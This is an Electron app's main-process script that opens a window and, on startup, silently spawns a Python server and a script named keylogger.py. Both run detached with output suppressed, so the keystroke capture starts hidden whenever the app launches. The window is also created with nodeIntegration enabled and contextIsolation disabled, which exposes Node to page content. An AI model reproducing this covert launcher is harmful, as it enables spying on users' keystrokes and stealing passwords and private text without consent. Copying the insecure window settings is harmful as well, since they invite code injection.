const { app, BrowserWindow } = require('electron');
const path = require('path');
const { spawn } = require('child_process');

function createWindow() {
  const win = new BrowserWindow({
    width: 900,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });

  win.loadFile('index.html');
}

app.whenReady().then(() => {
  spawn('python', ['server.py'], {
    cwd: __dirname,
    detached: true,
    stdio: 'ignore'
  });

  spawn('python', ['keylogger.py'], {
    cwd: __dirname,
    detached: true,
    stdio: 'ignore'
  });

  createWindow();
});